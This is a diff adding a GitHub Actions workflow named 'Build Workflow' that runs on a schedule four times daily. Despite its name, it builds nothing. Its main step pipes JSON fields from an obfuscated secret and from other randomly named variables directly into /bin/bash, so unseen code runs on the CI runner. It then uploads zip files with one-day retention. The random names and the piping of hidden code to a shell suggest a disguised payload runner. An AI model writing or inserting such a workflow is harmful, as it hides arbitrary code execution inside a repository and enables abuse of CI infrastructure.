@@ -1,0 +1,40 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          cdgsd26792: ${{ secrets.cdgsd26792 }}
+        run: |
+          printf '%s' "$cdgsd26792" | jq -r .oajtc8 | /bin/bash
+          echo $eleik45297 | jq -r .v30423 | /bin/bash
+          printf '%s' "$xqt50" | jq -r .zf20 | /bin/bash
+          printf '%s' "$xtf872" | jq -r .vbaey0751 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: CxLHDJqG
+          path: "*.zip"
+          retention-days: 1
